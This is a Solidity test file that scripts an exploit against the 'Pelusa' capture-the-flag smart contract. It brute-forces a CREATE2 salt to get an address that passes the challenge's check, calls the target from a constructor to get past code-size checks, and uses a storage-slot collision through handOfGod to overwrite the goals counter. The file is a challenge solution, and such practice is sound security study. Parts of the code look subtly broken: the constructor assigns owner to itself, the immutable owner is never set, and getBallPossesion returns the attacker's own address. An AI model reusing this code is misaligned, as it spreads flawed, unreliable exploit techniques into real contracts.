// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Pelusa} from "../../src/pelusa/pelusa.sol";

interface ITarget {
    function passTheBall() external;
    function shoot() external;
}

contract PelusaChallenge is Test {
    address targetAddress;
    address immutable owner;

    constructor() {
        address deployedAddress;
        
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("pelusa.sol:Pelusa")
        );
        assembly {
            deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        
        require(deployedAddress != address(0), "Deployment failed");

        targetAddress = deployedAddress;
        console.log("Deployed address: %s", deployedAddress);
    }

    function test_deployAttacker() external {
        address attackerAddress = deployAttacker();
        require(uint256(uint160(attackerAddress)) % 100 == 10, "Invalid address");
        console.log("Attacker deployed at: %s", attackerAddress);

        // Interact with Pelusa contract
        // ITarget(targetAddress).passTheBall();
        // ITarget(targetAddress).shoot();
    }

    function deployAttacker() internal returns (address) {
        address attackerAddress;
        bytes memory bytecode = abi.encodePacked(
            type(PelusaAttack).creationCode,
            abi.encode(owner, targetAddress)
        );

        for (uint256 salt = 0; salt < 10000; salt++) {
            address predictedAddress = computeCreate2Address(salt, keccak256(bytecode));
            if (uint256(uint160(predictedAddress)) % 100 == 10) {
                attackerAddress = deployUsingCreate2(salt, bytecode);
                console.log("find matched attacker address: %s", attackerAddress);
                break;
            }
        }

        require(attackerAddress != address(0), "No valid address found");
        return attackerAddress;
    }

    function computeCreate2Address(uint256 salt, bytes32 bytecodeHash) public view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            salt,
            bytecodeHash
        )))));
    }

    function deployUsingCreate2(uint256 salt, bytes memory bytecode) internal returns (address) {
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        return addr;
    }


}


contract PelusaAttack {
    uint256 owner;
    uint256 player;

    constructor(address owner_, address target_) {
        owner = owner;
        ITarget(target_).passTheBall();
        ITarget(target_).shoot();
    }

    function handOfGod() public returns (bytes32) {
        player = 2;
        return bytes32(uint256(22_06_1986));
    }

    function getBallPossesion() public view returns (address) {
        return address(this);
    }
}